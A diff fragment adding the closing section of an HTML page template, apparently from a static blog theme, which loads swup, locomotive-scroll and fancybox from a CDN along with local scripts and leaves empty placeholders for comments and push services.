+<script src="//cdn.jsdelivr.net/npm/swup@2.0.19/dist/swup.min.js"></script>
+
+    
+<script src="//cdn.jsdelivr.net/npm/locomotive-scroll@4.1.4/dist/locomotive-scroll.min.js"></script>
+
+    
+<script src="//cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=v1.1.8"></script>
+    
+
+    
+
+    
+
+
+
+<!-- 评论插件 -->
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=v1.1.8"></script>
+
+</body>
+
+</html>
